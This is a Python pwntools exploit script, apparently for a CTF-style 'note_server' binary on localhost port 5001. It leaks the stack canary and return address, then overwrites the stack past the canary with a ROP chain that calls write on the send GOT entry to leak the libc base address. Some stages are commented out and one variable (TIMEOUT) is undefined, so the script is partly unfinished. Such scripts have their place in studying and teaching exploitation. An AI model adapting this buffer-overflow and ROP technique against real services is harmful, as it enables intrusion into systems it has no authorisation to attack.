from pwn import *
from concurrent import futures
from base64 import b64encode,b64decode
from time import sleep

RHOST = '127.0.0.1'
RPORT = '5001'

buffer_filler = b'\x01\xffjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjj'
smash_cpy = b'\x02\x00\x00\xff'
legal_cpy = b'\x02\x00\x04\xff'
read = b'\x03'
fill = b'\x01\x04\xde\xad\xbe\xef'
bin_offset = 0x1674

def flip_endian(word):
    word = int(word,16) # ret is a le hex string
    word = p64(word) # flips endian of a string
    word = word.hex() # be
    return word

def deliver_payload(payload):
    r.send(payload)
    return r.recv().hex()

################################################################################
# CANARY
################################################################################
'''
r=remote(RHOST,RPORT)
payload = buffer_filler
payload += buffer_filler
payload += buffer_filler
payload += buffer_filler
payload += fill
payload += legal_cpy
payload += read

raw = deliver_payload(payload)

EOB=1024*2
trash = raw[EOB:EOB+16]
canary = raw[EOB+16:EOB+32]
ebp = raw[EOB+32:EOB+48]
ret = raw[EOB+48:EOB+64]

base_addr = flip_endian(ret)
base_addr = int(base_addr,16) - bin_offset
base_addr = hex(base_addr) 
base_big_string = base_addr

base_addr = flip_endian(base_addr)
base_little_string = base_addr
'''

################################################################################
# SMASH THROUGH CANARY
################################################################################
'''
r=remote(RHOST,RPORT)

i_canary = int(canary,16)
b_canary = i_canary.to_bytes(8,'big')
'''


'''
pad = b'b'*239
payload = b'\x01\xffaaaabbbb' + b_canary + pad
payload += buffer_filler
payload += buffer_filler
payload += buffer_filler
payload += fill
payload += smash_cpy
payload += read
raw = deliver_payload(payload)
#close
r.close()
'''

################################################################################
# ELF
################################################################################
be_canary = 0x7a117c4776371000
b_canary = p64(be_canary)

be_ret = 0x0000561410c94674
b_ret = p64(be_ret - 0x1674)

# --- leak libc
SOCKFD = 4

elf  = ELF("./note_server")
libc = ELF("/usr/lib/x86_64-linux-gnu/libc-2.30.so")

bin_base = 0x0000561410c93000
pop_rdi_ret =         bin_base + 0x164b
pop_rsi_pop_r15_ret = bin_base + 0x1649
pop_rdx_ret =         bin_base + 0x1265
got_send =            bin_base + 0x4050
call_write =          bin_base + 0x154e

rop  = p64(pop_rdi_ret)
rop += p64(SOCKFD)
rop += p64(pop_rsi_pop_r15_ret)
rop += p64(got_send)
rop += b"C"*8
rop += p64(pop_rdx_ret)
rop += p64(8)
rop += p64(call_write)

pad = b'b'*175
payload = b'\x01\xffaaaabbbb' + b_canary
payload += rop
payload += pad
payload += buffer_filler
payload += buffer_filler
payload += buffer_filler
payload += fill
payload += read

# send payload
con = remote("localhost", 5001)
con.send(payload)
print(con.recv())
res = con.clean(timeout=TIMEOUT)
con.close()

# get libc base address
libc_send = u64(res)
print("[\033[92m+\033[0m] libc_send = " + hex(libc_send))
libc.address = libc_send - libc.sym["send"]
print("[\033[92m+\033[0m] libc_base = " + hex(libc.address))
